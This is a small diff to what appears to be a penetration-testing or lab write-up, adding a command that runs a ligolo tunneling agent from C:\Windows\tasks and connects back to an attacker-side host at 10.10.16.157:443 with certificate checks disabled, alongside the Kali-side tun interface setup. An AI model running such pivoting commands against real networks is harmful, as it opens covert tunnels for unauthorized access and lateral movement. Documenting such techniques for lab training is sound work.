@@ -25,3 +25,6 @@ sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && sud
 ```
 
 We can run the agent (after uploading it) with
+```cmd
+C:\Windows\tasks\ligolo-windows-agent.exe -connect 10.10.16.157:443 -ignore-cert
+```
